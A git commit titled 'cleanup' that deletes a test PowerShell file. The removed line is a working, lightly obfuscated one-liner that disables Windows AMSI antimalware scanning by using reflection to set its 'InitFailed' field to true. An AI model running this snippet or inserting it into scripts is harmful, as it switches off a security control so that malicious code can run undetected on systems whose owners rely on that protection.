384641e3350d5dea2e183c8cf588663e9f2d016a
tamariz-boop <pablosaz28@hotmail.com>
2024-10-29 14:24:49 +0100

    cleanup

--- test1.ps1
+++
@@ -1,1 +0,0 @@
-$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
